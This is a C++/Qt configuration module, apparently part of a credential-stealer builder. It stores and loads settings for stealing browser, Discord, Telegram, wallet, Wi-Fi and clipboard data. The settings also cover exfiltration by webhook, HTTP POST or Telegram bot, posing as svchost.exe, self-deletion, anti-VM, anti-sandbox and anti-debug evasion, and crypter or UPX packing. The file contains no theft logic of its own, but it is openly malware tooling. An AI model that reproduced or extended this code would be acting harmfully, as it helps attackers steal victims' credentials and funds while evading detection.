#include "config.h"
#include <QJsonDocument>
#include <QFile>
#include <QJsonArray>

StealerConfig::StealerConfig() {
    // Default values
    grabChrome = false;
    grabFirefox = false;
    grabEdge = false;
    grabBrave = false;
    grabDiscord = false;
    grabTelegram = false;
    grabWallets = false;
    grabWifi = false;
    grabClipboard = false;
    
    webhookUrl = "";
    httpPostUrl = "";
    telegramToken = "";
    telegramChatId = "";
    
    captureScreen = false;
    
    collectHWID = false;
    collectIP = false;
    collectOSInfo = false;
    collectInstalledAV = false;
    collectProcessList = false;
    collectSpecs = false;
    
    processName = "svchost.exe";
    mutexName = "";
    selfDestruct = false;
    meltFile = false;
    
    antiVM = false;
    antiSandbox = false;
    antiDebug = false;
    sleepEvasion = false;
    
    outputName = "output.exe";
    iconPath = "";
    architecture = "x64";
    obfuscate = false;
    upxPack = false;
    useCrypter = false;
    compiler = "auto";
}

QJsonObject StealerConfig::toJson() const {
    QJsonObject obj;
    
    // Grabber
    QJsonObject grabber;
    grabber["chrome"] = grabChrome;
    grabber["firefox"] = grabFirefox;
    grabber["edge"] = grabEdge;
    grabber["brave"] = grabBrave;
    grabber["discord"] = grabDiscord;
    grabber["telegram"] = grabTelegram;
    grabber["wallets"] = grabWallets;
    grabber["wifi"] = grabWifi;
    grabber["clipboard"] = grabClipboard;
    obj["grabber"] = grabber;
    
    // Exfiltration
    QJsonObject exfil;
    exfil["webhook"] = webhookUrl;
    exfil["httpPost"] = httpPostUrl;
    exfil["telegramToken"] = telegramToken;
    exfil["telegramChatId"] = telegramChatId;
    obj["exfiltration"] = exfil;
    
    // Screenshot
    obj["captureScreen"] = captureScreen;
    
    // System info
    QJsonObject sysinfo;
    sysinfo["hwid"] = collectHWID;
    sysinfo["ip"] = collectIP;
    sysinfo["os"] = collectOSInfo;
    sysinfo["av"] = collectInstalledAV;
    sysinfo["processes"] = collectProcessList;
    sysinfo["specs"] = collectSpecs;
    obj["systemInfo"] = sysinfo;
    
    // Stealth
    QJsonObject stealth;
    stealth["processName"] = processName;
    stealth["mutexName"] = mutexName;
    stealth["selfDestruct"] = selfDestruct;
    stealth["melt"] = meltFile;
    obj["stealth"] = stealth;
    
    // Anti-analysis
    QJsonObject anti;
    anti["vm"] = antiVM;
    anti["sandbox"] = antiSandbox;
    anti["debug"] = antiDebug;
    anti["sleepEvasion"] = sleepEvasion;
    obj["antiAnalysis"] = anti;
    
    // Build
    QJsonObject build;
    build["outputName"] = outputName;
    build["iconPath"] = iconPath;
    build["architecture"] = architecture;
    build["obfuscate"] = obfuscate;
    build["upxPack"] = upxPack;
    build["useCrypter"] = useCrypter;
    build["compiler"] = compiler;
    obj["build"] = build;
    
    return obj;
}

void StealerConfig::fromJson(const QJsonObject& json) {
    // Grabber
    if (json.contains("grabber")) {
        QJsonObject grab = json["grabber"].toObject();
        grabChrome = grab["chrome"].toBool();
        grabFirefox = grab["firefox"].toBool();
        grabEdge = grab["edge"].toBool();
        grabBrave = grab["brave"].toBool();
        grabDiscord = grab["discord"].toBool();
        grabTelegram = grab["telegram"].toBool();
        grabWallets = grab["wallets"].toBool();
        grabWifi = grab["wifi"].toBool();
        grabClipboard = grab["clipboard"].toBool();
    }
    
    // Exfiltration
    if (json.contains("exfiltration")) {
        QJsonObject exfil = json["exfiltration"].toObject();
        webhookUrl = exfil["webhook"].toString();
        httpPostUrl = exfil["httpPost"].toString();
        telegramToken = exfil["telegramToken"].toString();
        telegramChatId = exfil["telegramChatId"].toString();
    }
    
    // Screenshot
    if (json.contains("captureScreen")) {
        captureScreen = json["captureScreen"].toBool();
    }
    
    // System info
    if (json.contains("systemInfo")) {
        QJsonObject si = json["systemInfo"].toObject();
        collectHWID = si["hwid"].toBool();
        collectIP = si["ip"].toBool();
        collectOSInfo = si["os"].toBool();
        collectInstalledAV = si["av"].toBool();
        collectProcessList = si["processes"].toBool();
        collectSpecs = si["specs"].toBool();
    }
    
    // Stealth
    if (json.contains("stealth")) {
        QJsonObject st = json["stealth"].toObject();
        processName = st["processName"].toString();
        mutexName = st["mutexName"].toString();
        selfDestruct = st["selfDestruct"].toBool();
        meltFile = st["melt"].toBool();
    }
    
    // Anti-analysis
    if (json.contains("antiAnalysis")) {
        QJsonObject anti = json["antiAnalysis"].toObject();
        antiVM = anti["vm"].toBool();
        antiSandbox = anti["sandbox"].toBool();
        antiDebug = anti["debug"].toBool();
        sleepEvasion = anti["sleepEvasion"].toBool();
    }
    
    // Build
    if (json.contains("build")) {
        QJsonObject build = json["build"].toObject();
        outputName = build["outputName"].toString();
        iconPath = build["iconPath"].toString();
        architecture = build["architecture"].toString();
        obfuscate = build["obfuscate"].toBool();
        upxPack = build["upxPack"].toBool();
        useCrypter = build["useCrypter"].toBool();
        compiler = build["compiler"].toString();
    }
}

bool StealerConfig::saveToFile(const QString& filename) const {
    QFile file(filename);
    if (!file.open(QIODevice::WriteOnly)) {
        return false;
    }
    
    QJsonDocument doc(toJson());
    file.write(doc.toJson(QJsonDocument::Indented));
    file.close();
    return true;
}

bool StealerConfig::loadFromFile(const QString& filename) {
    QFile file(filename);
    if (!file.open(QIODevice::ReadOnly)) {
        return false;
    }
    
    QByteArray data = file.readAll();
    file.close();
    
    QJsonDocument doc = QJsonDocument::fromJson(data);
    if (doc.isNull() || !doc.isObject()) {
        return false;
    }
    
    fromJson(doc.object());
    return true;
}









// Commit 82 - 2024-10-08
